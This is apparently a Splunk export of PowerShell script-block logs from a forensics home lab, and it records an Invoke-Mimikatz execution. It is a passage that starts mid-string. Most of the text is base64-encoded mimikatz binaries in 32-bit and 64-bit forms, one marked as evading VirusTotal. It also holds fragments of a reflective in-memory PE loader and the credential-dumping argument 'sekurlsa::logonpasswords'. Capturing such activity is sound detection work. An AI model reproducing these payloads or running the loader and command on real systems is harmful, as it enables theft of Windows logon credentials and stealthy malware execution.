AAACnCKcQpxinIKcopzCnAKgIqBCoGKggqCioMKhwqniqgKqIqpCqmKqgqqiqsKq4qsCqyKrQqtiq4KroqvCq+KoAqwirEKsYqyCrKKtIq1CrWKtgq2ircKt4q4CriKuQq5iroKuoq7CruKvAq8ir0KvYq+Cr6Kvwq/irAKwQrCCsKKwwrDisSKxQrFisYKxorHCseKyArIiskKyYrKCsqKywrLiswKzIrNCs2KzgrOis8Kz4rACtCK0QrRitIK0orTCtOK1ArUitUK1YrWCtaK1wrXitgK2IrZCtmK2graitsK24rcit0K3orfCt+K0ArgiuEK4YriCuKK4wrjiuQK5IrlCuWK5grmiucK54roCuiK6QrpiuoK6orrCuuK7Arsiu0K7grgivEK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvmK+gr6ivsK+4r8CvyK/Qr9iv4K/or/Cv+K8AwAsABAMAAACgCKAQoBigIKAooDCgOKBAoEigUKBooHCgeKCAoIigkKDgoOig8KD4oDChOKFAoUihUKFYoWChaKFwoXihgKGIoZChmKGgoaihsKHIoeCh6KHwofihAKIIohCiGKIgoiiiMKI4okCiSKJQoliiYKJoonCieKKAooiikKKYoqCiqKKworiiwKLIotCi2KLgouii8KL4ogCjCKMQoxijIKMoozCjOKNQo2ijcKOAo5CjmKOgo7CjuKPQo9ij8KP4oxCkGKQgpDCkOKRApFCkWKRgpHCkeKSQpJiksKS4pNCk2KTwpPikEKUYpTClOKVQpVilcKV4pZClmKWgpbCluKXApdCl2KXgpeilAKYYpjCmOKaApoimkKaYpqCmqKYApyCnKKcwpzinQKdIp1CnWKdgp2incKd4p4CniKeQp5inoKeop7CnuKfAp8in0KfYpwCoCKgQqBioIKgoqDCoOKhAqEioUKhYqGCoaKhwqHiogKiIqJComKigqLCouKjIqNCo2KjgqOio8Kj4qACpCKkQqRipIKkoqTCpOKlAqUipgKmoqbCpuKnAqcip0KnYqfCp+KkAqgiqEKoYqiCqKKowqjiqQKpIqlCqWKpgqmiqcKqAqoiqmKqgqrCquKrIqtCq4KroqviqAKsQqxirKKswqzirUKtoq3CriKugq6irsKu4q8CryKvQq9ir4Kvoq/Cr+KsArAisEKwYrCCsKKwwrDisQKxIrFCsWKxgrGiscKx4rICsiKyQrJisoKyorLCsyKzgrOis8Kz4rACtCK0QrRitIK0orTCtOK1ArUitUK1YrWCteK2QrZitoK2orbCtuK3Arcit0K3YreCt6K3wrfitAK4IrhCuGK4griiuMK44rkCuSK5QrliuYK5ornCueK6AroiukK6YrqCuqK6wrriuwK7IrtCu2K7gruiu8K74rgCvCK8QrxivIK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvmK+gr7iv0K/Yr+Cv6K/wr/ivANALAKgCAAAAoAigEKAYoCCgKKAwoDigQKBIoFCgWKBgoGigcKB4oICgiKCQoJigoKCooLCgwKDIoOCg6KDwoPigAKEIoRihIKEwoTihSKFQoWChaKF4oYChkKGYoaihsKHIoeCh6KH4oQCiEKIYoiiiMKJAokiiYKJoonCieKKAopiioKKoorCiuKLAosii0KLYouCi6KLwoviiAKMIoxCjGKMgoyijMKM4o0CjSKNQo1ijYKNoo3CjeKOAo4ijkKOYo6CjqKOwo/ijAKQYpDCkOKRApEikUKRYpGCkaKRwpHikgKSIpJCkmKSgpKiksKS4pMCkyKTQpNik4KTopPCk+KQApQilEKUYpSClKKUwpTilQKVIpVClWKVgpWilcKV4pYCliKWQpZiloKWopbCluKXApcil0KXYpeilAKYIphCmGKYgpiimMKY4pkCmSKZQplimYKZopnCmeKaApoimkKaopsCmyKbQptim4KbopvCm+KYApwinEKcYpyCnKKcwpzinQKdIp1CnWKdgp2incKd4p4CniKeQp5inoKeop7CnuKfAp8in0KfYp+Cn6Kfwp/inAKgIqBCoKKhAqEioUKhYqGCoaKhwqHiogKiIqJComKigqKiosKjAqMio2KjgqPioEKkYqSCpKKkwqTipUKlwqZCpsKm4qdCp2KnwqfipEKogqiiqQKpIqlCqWKpgqniqoKqoqrCq0KrYquCq6KrwqviqAKsIqxCrGKsgqyirMKs4q0CrSKtQq1irYKtoq3CreKuAq4irkKuYq6CrqKuwq7irwKvIqwCsMKw4rECsSKxQrFisYKxorHCseKyArIiskKyYrKCsqKywrLiswKzIrNCs2KzgrOis8Kz4rCCtKK0wrTitgK3Irdit6K34rQCuCK4A4AsAzAAAABCmGKYgpiimMKZApkimUKZYpmCmaKZwpnimgKaIppCmmKagpqimsKa4psCmyKbQptim4KbopvCm+KYApwinEKcYpyCnKKcwpzinQKdIp1CnWKdgp2incKd4p4CniKeQp5inoKeop7CnuKfAp8in0KfYp+Cn6Kfwp/inAKgIqBCoGKggqCioMKg4qECoSKhQqFioYKhoqHCoeKiAqIiokKiYqKCoqKiwqLiowKjIqNCo2KjgqOio8Kj4qACpCKkQqRipuKoA8AsAHAAAAACgCKAQoBig6KD4oAChGKEgoQAAADAQAIQAAABwobih2KH4oRiiOKJoooCiiKKQosii0KIgo1ilgKiIqJComKigqKiosKi4qMCoyKjYqOCo6KjwqPioAKkIqRCpoKmoqaCrwKvQq+irAKxArFCskKygrOCs8KwwrUCtwK3QrRCuIK5grnCusK7ArgCvEK9Qr2CvoK+wr/CvAEAQALAAAAAAoFCgYKCgoLCg4KDooPCg+KAAoQihGKFAolCikKKgouCi8KIwo0CjgKOQo9Cj4KMgpDCkcKSApMCk0KQQpSClYKVwpbClwKUAphCmUKZgpqCmsKbwpgCnOKfgp/CnkKjgqDCpgKnQqSCqcKqAqsCq0Kpgq3CrsKvAqwCsEKxQrGCs4KzwrDCtQK2ArZCt0K3grUCuWK5wrsCu0K4QryCvYK9wr7CvwK8AUBAAeAAAAACgEKBQoGCgEKEgoWChcKGwocChAKIQolCiYKKgorCi8KIAo0CjUKOQo6CjYKSwpAClUKWgpYCm0KYgp3CnwKcQqICo0KggqXCpwKkQqmCqsKoAq1CroKvwq0CskKzgrDCtgK3wrQiuUK6grvCuwK8AYBAAoAAAABCgYKCwoAChUKGgofChQKKQotCi2KLooiCjOKNwo4ij0KMgpHCkwKQQpWClsKUQphimKKaAptCmIKdwp8CnEKhgqLCo8Kj4qAipUKmQqZipqKngqeip+KlAqpCq4KpAq0irWKugq/CrMKw4rEiskKzgrDCtmK24reCtAK4orkiucK6Qrriu2K4AryCvSK9or5CvsK/Yr/ivAHAQACABAAAgoECgiKCwoLigwKDQoPigGKFgoYihkKGYoaih0KHwoRiiOKJgooCiqKLIovCiEKM4o1ijgKOgo8ij6KMQpDCkWKR4pKCkwKTopAilMKVQpXilmKXApeClCKYoplCmcKaYprim4KYApyinSKdwp5CnuKfYpwCoIKhIqGiokKiwqNio+KggqUCpaKlwqXipgKmIqbCpuKnAqcip0Kn4qQCqCKoQqhiqQKpIqlCqWKpgqoiqkKqYqqCqqKrQqtiq4KroqvCqGKsgqyirMKs4q1CrYKuAq5irqKvIq+Cr8KsQrFisoKzIrOisGK0grSitMK04rUCtaK1wrXitgK2IrZCtmK2grbityK3orQCuEK4wrkiuWK54rgAAAIAQAPQBAACYoqCiqKKworii4KLoovCi+KIAoyijMKM4o0CjSKNwo3ijgKOIo5CjuKPAo8ij0KPYowCkCKQQpBikIKRIpFCkWKRgpGikkKSYpKCkqKSwpNik4KTopPCk+KQgpSilMKU4pUClaKVwpXilgKWIpbCluKXApcil0KX4pQCmCKYQphimQKZIplCmWKZgpoimkKaYpqCmqKbYpuCm6KbwpvimAKcopzCnOKdAp0inUKdYp2CniKeQp5inoKeop7Cn2Kfgp+in8Kf4pwCoCKgQqCCoKKg4qFCoaKhwqICoiKiYqKCosKi4qMio0KjgqOio+KgAqRCpGKkoqUCpWKlgqXCpeKmIqZCpoKm4qcCp0KnYqeip8KkAqgiqGKogqjCqOKpIqlCqYKpoqniqgKqQqpiqqKrAqsiq2KrgqvCq+KoIqxCrIKsoqzirQKtQq1iraKtwq4CriKuYq6CrsKu4q8ir0Kvgq+ir+KsArBCsGKworDCsQKxYrHCseKyIrJCsoKyorLiswKzQrNis6KzwrACtCK0YrSCtMK04rUitUK1grWiteK2ArZCtmK2orbCtwK3Irdit4K3wrQiuEK4griiuOK5QrmiugK6YrrCuyK7gruiu+K4ArxCvGK8or0CvWK9wr4ivkK+4r9ivAAAAkBAAZAAAAACgIKBIoGiggKCQoKCgsKDQoOCgGKEgoSihMKE4oUChaKFwoXihgKGIoZChmKGgoaihsKG4ocChyKHQodih4KHoofCh+KEAohCiGKIgoiiiMKI4okCiSKJQogAAAAAAAAAAAAA='\n\n  \t# mimikatz 2.2.0 (win 32) #18362\n    # SHA256 hash: 08AB87667A5C6EB25DDB1BD659613EF8C773526AE28B191C34E854CD6F13F8D4 \n    # VirusTotal Analysis: no signature yet ;)\n    $PEBytes32 = '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\nd261f22f-3dc8-4dc6-914f-cd178abb26fe","_time":"2025-11-23T14:39:14.630+0000","category":"Execute","dvc":"DESKTOP-78CU07R","dvc_nt_host":"DESKTOP-78CU07R","event_id":"505","eventtype":["endpoint_services_processes","windows_event_signature","windows_ta_data"],"host":"DESKTOP-78CU07R","id":"505","index":"mydfir-project","linecount":"27","punct":"//_::._=--/===-==-------==--====___=__=________.__","severity":"medium","severity_id":"3","signature_id":"4104","source":"Microsoft-Windows-PowerShell/Operational","sourcetype":"WinEventLog","splunk_server":"chalitha-splunk","tag":"track_event_signatures","tag::eventtype":"track_event_signatures","vendor_product":"Microsoft Windows"}}
{"preview":false,"result":{"ComputerName":"DESKTOP-78CU07R","DebugPreference":"Continue","EventCode":"4104","EventType":"3","ExeArgs":"sekurlsa::logonpasswords exit","Keywords":"None","LogName":"Microsoft-Windows-PowerShell/Operational","Message":"Splunk","OpCode":"On","Output":"[System.Runtime.InteropServices.Marshal]","OutputPtr":"$WStringFunc.Invoke($WStringInput)","PEBytes64":"'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABefCzVGh1ChhodQoYaHUKGroGzhh8dQoaugbGGjx1Chq6BsIYVHUKGG3BGhwsdQoYbcEGHEh1ChgGA3oYYHUKGfPOJhh4dQoaB9omGGB1ChhNlxYYYHUKGG3BHhzodQoZsgDmGEB1ChhNl0YY/HUKGGh1Dhi0fQobQcEqHeh1ChtBwQocbHUKG0HC9hhsdQobQcECHGx1ChlJpY2gaHUKGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUEUAAGSGBwBA7LldAAAAAAAAAADwACIgCwIOFwCmCgAAZAYAAAAAADScCAAAEAAAAAAAgAEAAAAAEAAAAAIAAAUAAgAAAAAABQACAAAAAAAAYBEAAAQAAAAAAAADAGABAAAQAAAAAAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAMDoDwBgAAAAIOkPADACAAAAMBEAiAIAAACwEADUYQAAAAAAAAAAAAAAQBEA+BcAAHCgDwAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgNIKAAgBAAAAAAAAAAAAAADACgBAEQAAIOUPAGAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAACgpQoAABAAAACmCgAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAAlmUFAADACgAAZgUAAKoKAAAAAAAAAAAAAAAAAEAAAEAuZGF0YQAAALR9AAAAMBAAAGQAAAAQEAAAAAAAAAAAAAAAAABAAADALnBkYXRhAADUYQAAALAQAABiAAAAdBAAAAAAAAAAAAAAAAAAQAAAQF9SREFUQQAAlAAAAAAgEQAAAgAAANYQAAAAAAAAAAAAAAAAAEAAAEAucnNyYwAAAIgCAAAAMBEAAAQAAADYEAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAD4FwAAAEARAAAYAAAA3BAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiLxEiJWAhIiXAQSIl4IESIQBhVQVZBV0iNaKhIgexAAQAAD7eFkAAAADPbZsdEJED/AEyL8USITCRCQLcEiFwkQ2aFwHQfSIuViAAAAEiNTCRFRIvAiEQkRECK+Oi+owgAQIDHBUiLtaAAAAA5nagAAAB1EmY5HnQNigZAD7bPQP7HiEQMQA+3BolFcEk5Hg+EHQEAAEQPtv9AgP//D4f1AAAAQTleGHQrSI0NV0gLAOj+iwAAQbgBAAAASI1MJEBBi9fo8/IAAEiNDUhICwDo34sAAEyNRCRASIu9mAAAAEWLz0E5Xgh0JQ+3BkiNTXBIiUwkMLqwNjEASYsOiUQkKEiJfCQg/xX7vQoA6x5Jiw5IjUVwSIlEJDAz0kiJfCQoSIlcJCD/FRO+CgCFwHVBQTleGHQpSI0N4kcLAOhxiwAAi1VwQbgBAAAASIvP6GjyAABIjQ29RwsA6FSLAAAPtwaLTXA7yA+Ww3dSZokO601BOV4ISI0Ns0cLAEiNFcxHCwBEi8BID0XRSI0N3kcLAOgdiwAA6yZBuf8AAABIjQ0aSAsATIvGQYvX6AOLAADrDEiNDZZICwDo9YoAAEyNnCRAAQAAi8NJi1sgSYtzKEmLezhJi+NBX0FeXcPMzEyL3EmJWwhJiWsQSYlzGFdIgexQAQAAQQ+3AUmL6GaDwAJMi8FIi4wkgAEAADP/ZkGJQyBJi/FIhckPhNYAAABBuf8AAABmQTvBD4eyAAAAx0QkSAEAAABJjUMgSIlEJEBFM8lIjUQkUEiJRCQ4ZolUJDBMiUQkKOij/f//hcAPhJ0AAAAPt5wkeAEAAIP7AnJguZAAAABmOUwcTnU7ZoPrAmY7HmaJnCR4AQAAQA+Wx3cWRA+3w0iNVCRQSIvN6HyhCABmiR7rWQ+3FkiNDf1HCwBED7fD6xJED7ZEHE9IjQ1qSAsAD7ZUHE7o5IkAAOswi9NIjQ3FSAsA6NSJAADrIA+30EiNDURJCwBNi8HowIkAAOsMSI0Ns0kLAOiyiQAATI2cJFABAACLx0mLWxBJi2sYSYtzIEmL41/DzMzMSI0FeZoQAMNMiUQkGEyJTCQgU1VWV0iD7DhJi/BIjWwkeEiL2kiL+ejT////SIlsJChMi85Ig2QkIABMi8NIi9dIiwjo098IAIPJ/4XAD0jBSIPEOF9eXVvDzMxAU0iD7HBIi8JIi9lIi8hIjVQkUP8V8rUKAIXAdHcPt1QkWkiNTCRgRA+3RCRYD7dEJFxED7dUJFZED7dcJFJED7dMJFCJRCRAiVQkOLoQAAAARIlEJDBMjQVWSQsARIlUJChEiVwkIOg/////hcB+JEyNTCRgSMdEJCAPAAAAQbgYAAAASI0VSEkLAEiLy/8V17kKAEiDxHBbw8xAU0iD7EBIi9lBsAFIjUwkMP8VIbwKAIXAeC8Pt0QkMEiNFRFJCwBMi0wkOEG4GwAAAEiLy4lEJCD/FZG5CgBIjUwkMP8V9rsKAEiDxEBbw0yL3FNIg+xQx0QkQGtpd2lIjQUpSgsASYlD4LsBAAAASI0FEUoLAESLy0mJQ9i6AAQAAEmJQ9C5AAABAEG4ABAAAEmJQ8j/FRy7CgBIiQVlkBAASIXAdHRIg2QkIABIjRVbkBAARTPJRTPASIvI/xXUugoAhcB5GIvQSI0Nd0gLAOjGhwAASIMlMpAQAADrSEiLDSGQEABIjRUqkBAASINkJCAARTPJRTPA/xXIugoAhcB5JIvQSI0Nq0gLAOiKhwAASIMl/o8QAADrDEiNDQVJCwDodIcAAEiDPdiPEAAAdBRIgz3WjxAAAHQKSIM91I8QAAB1BzPb6AsAAACLw0iDxFBbw8zMzEiD7ChIiw21jxAASIXJdA7/FWK6CgBIgyWijxAAAEiLDZOPEABIhcl0Dv8VOLoKAEiDJYCPEAAASIsNcY8QAEiFyXQO/xX+uQoASIMlXo8QAABIg8Qow8xIi8REiUggRIlAGEiJUBBIiUgIVVNWV0FUQVVBVkFXSI1ooUiB7IgAAAAz20iNTedEi+tIiR3ejxAASI09148QAP8VGa4KAESNSxJFM8Az0kiNTef/Fe61CgBMi/BIg/j/D4QbAwAAi/OJXX9IjUX3x0X3IAAAAESLzkiJRCQgTI1F5zPSSYvO/xXCtQoAiUVvRIvghcAPhM0CAABIjUV3SIlcJChFM8lIiUQkIEUzwIldd0iNVfdJi87/FYC1CgCFwA+FoQIAAP8VwrIKAIP4eg+FkgIAAItVd41Ixv8VxbIKAEyL+EiFwA+EegIAAMcACAAAAEiNVfdEi013SI1Fd0iJXCQoTYvHSYvOSIlEJCD/FSm1CgCFwA+EQQIAALkDAAAASIlcJDBEi8GJXCQoiUwkIEUzyUmNTwQz0v8VXbIKAEyL4EiD+P8PhPgBAABIjVXXx0XXDAAAAEiLyP8V3KwKAITAD4TRAQAAD7dV3UiNBXNHCwBED7dF24vLZkQ5QP51CWY5EA+ESwEAAP/BSIPAEIP5BnLlSIvzSIX2D4SVAQAA9kYEAg+EiwEAALqgAAAAjUqg/xXrsQoASIkHSIXAD4RxAQAASI1VZ0mLzP8VYqwKAITAdC1IixdIi01nSIPCJP8VbawKAIXAeQ6L0EiNDaDaCwDo74QAAEiLTWf/FSmsCgBJjU8E6HDeCABIi8hIi9NIiwdIiUgQSIsP8g8QRdfyDxFBGItF34lBIEiLB0iJcGhIiwfGRBBwBEj/wkiD+gJ870iLB0mNTwRIiVwkMEUzyYlcJCjGQHJVSIsHRIloCLgDAAAARIvAiUQkIIvQ/xUmsQoASIvISIsHSIlIeEiLD0iLQXhI/8hIg/j9D4eCAAAAx4GAAAAAiBMAAEyNBQsBAABMiw8zyUiJXCQoM9KJXCQg/xW5sAoASIvISIsHSImIiAAAAEiFyXQdSIs/Qf/F62GL8UiNBQZGCwBIweYESAPw6a7+////FZywCgCL0EiNDRvaCwDo6oMAAEiLD0iLSXj/FXGwCgBIiw//FViwCgDrIP8VcLAKAIvQSI0Nj9oLAOi+gwAASIsP/xU5sAoASIkHi3V/SYvM/xU6sAoA6xT/FUKwCgCL0EiNDfHaCwDokIMAAESLZW9Ji8//FQewCgD/xol1f0WF5A+F9fz//0mLzv8VuLIKAOsU/xUIsAoAi9BIjQ1X2wsA6FaDAABFhe0PlcOLw0iBxIgAAABBX0FeQV1BXF9eW13DzMxIiVwkEFdIg+wgM/9Ii9lIhcl0YUg5u4gAAAB0WDm7gAAAAHRQSDl7eHRKRTPJSMdEJDCPAAAASI1UJDBIi8tFjUEB6DwAAACFwHQOi4uAAAAA/xWMrwoA67pIi0t4/xVorwoASIl7eIm7gAAAAEiJu4gAAABIi1wkODPASIPEIF/DzMxIiVwkCEiJbCQQSIl0JBhXQVRBVUFWQVdIg+xARTPtTIv6SIv5RYvhRYvwQYv1QY1VQY1K//8VNa8KAEiL2EiFwA+EAAEAAEGNbQdEO/VyEkGL1kiNDebaCwDoVYIAAEQ79UEPQu5Fi9W+AQAAAIXtD4SbAAAATY1PAkEPtlH+isqKwgwQgOHwD7bAQo0M1QIAAAAPRNBCjQTVAQAAAIgUGEGKQf+IBBlCjQzVAwAAAEGKAU2NSQiIBBlCjQzVBAAAAEGKQfmIBBlCjQzVBQAAAEGKQfqIBBlCjQzVBgAAAEGKQfuIBBlCjQzVBwAAAEGKQfyIBBlCjQzVCAAAAEGKQf1EA9aIBBlEO9UPgmn///9mgUs9//9IjVMBx0M5BARV/0EPt81BuD4AAAAPtgJIA9ZmA8hMK8Z18g+3wYhLQGbB6AiIQz+F9g+EnwAAAOmIAAAAQYvtSIX/dGJIi094SI1B/0iD+P13VEQPt08qQbhBAAAARTvIcjNMjUwkMEyJbCQgSIvT/xXrrQoAi+iFwHU6/xW/rQoAi1cISI0NHdoLAESLwOgJgQAA6yCLVwhIjQ2p2gsA6PiAAADrD4tXCEiNDVjbCwDo54AAACP1RYXkdAVIiz/rA0mL/UiF/w+Fb////0iLy/8VSq0KAEyNXCRAi8ZJi1swSYtrOEmLc0BJi+NBX0FeQV1BXF/DzMxIi8RIiVgQSIlwGFdIg+wgg2AIAIvyx0AMAAAAgEiL+UiL2UiFyXQz","PEHandle":"$PELoadedInfo[0]","PEInfo":"Get-PEDetailedInfo","RThreadHandle":"Invoke-CreateRemoteThread","RecordNumber":"409","RemotePEHandle":"$PELoadedInfo[1]","Sid":"S-1-5-21-1697325460-2044954953-441488130-1001","SidType":"0","SourceName":"Microsoft-Windows-PowerShell","Success":"$Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)","TaskCategory":"Execute","Type":"Warning","User":"NOT_TRANSLATED","VoidFuncAddr":"Get-MemoryProcAddress","WStringFunc":"[System.Runtime.InteropServices.Marshal]","WStringFuncAddr":"Get-MemoryProcAddress","WStringFuncDelegate":"Get-DelegateType","WStringInput":"[System.Runtime.InteropServices.Marshal]","_raw":"11/23/2025 08:39:14.627 AM\nLogName=Microsoft-Windows-PowerShell/Operational\nEventCode=4104\nEventType=3\nComputerName=DESKTOP-78CU07R\nUser=NOT_TRANSLATED\nSid=S-1-5-21-1697325460-2044954953-441488130-1001\nSidType=0\nSourceName=Microsoft-Windows-PowerShell\nType=Warning\nRecordNumber=409\nKeywords=None\nTaskCategory=Execute a Remote Command\nOpCode=On create calls\nMessage=Splunk could not get the description for this event. Either the component that raises this event is not installed on your local computer or the installation is corrupt.\n\nFormatMessage error:\n\nGot the following information from this event: \n\nE, handle returned is NULL\"\n\t\t}\n\t\t\n\t\t$PEHandle = $PELoadedInfo[0]\n\t\t$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process\n\t\t\n\t\t\n\t\t#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.\n\t\t$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants\n\t\tif (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -eq [IntPtr]::Zero))\n\t\t{\n\t\t\t#########################################\n\t\t\t### YOUR CODE GOES HERE\n\t\t\t#########################################\n                    Write-Verbose \"Calling function with WString return type\"\n\t\t\t\t    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"powershell_reflective_mimikatz\"\n\t\t\t\t    if ($WStringFuncAddr -eq 